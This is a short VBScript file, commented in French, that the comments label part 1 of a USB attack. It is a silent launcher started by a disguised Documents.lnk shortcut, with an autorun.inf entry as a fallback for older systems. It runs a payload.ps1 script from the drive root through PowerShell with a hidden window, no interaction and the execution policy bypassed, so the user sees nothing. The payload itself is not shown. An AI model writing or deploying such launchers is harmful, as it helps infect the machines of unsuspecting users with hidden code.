' ============================================================
' launcher.vbs – Lanceur silencieux (Partie 1)
'
' Déclenchement principal : double-clic sur Documents.lnk
'   wscript.exe //B "D:\launcher.vbs"
'
' Déclenchement de repli (systèmes anciens) : autorun.inf
'   open=launcher.vbs
'
' Rôle : exécuter payload.ps1 en arrière-plan, sans aucune
'         fenêtre visible, avec bypass de la politique PS.
' ============================================================
Option Explicit

Dim oShell, sDrive, sPayload, sCmd

' Récupère le répertoire du script (= racine du lecteur USB)
sDrive  = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))
sPayload = sDrive & "payload.ps1"

Set oShell = CreateObject("WScript.Shell")

' Construit la commande PowerShell entièrement masquée (WindowStyle 0)
sCmd = "powershell.exe -WindowStyle Hidden -NonInteractive " & _
       "-ExecutionPolicy Bypass -NoProfile -NoLogo " & _
       "-File """ & sPayload & """"

' Lance la commande de façon asynchrone (bShowWindow=0, bWaitOnReturn=False)
oShell.Run sCmd, 0, False

Set oShell = Nothing
WScript.Quit
